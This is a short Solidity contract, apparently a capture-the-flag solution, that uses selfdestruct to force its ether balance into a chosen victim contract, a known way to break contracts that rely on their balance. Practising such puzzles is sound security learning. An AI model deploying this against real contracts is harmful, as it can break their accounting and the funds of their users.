//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
//0x89066458a455138c23232334feC59CDc743511c8



contract Hack {

    address public victim;

    constructor(address _victim) {
        victim = _victim;
    }

    function attack() public payable{
        require(address(this).balance >= msg.value);
        selfdestruct(payable (victim));
    }

    fallback() external payable { }
    receive() external payable { }

}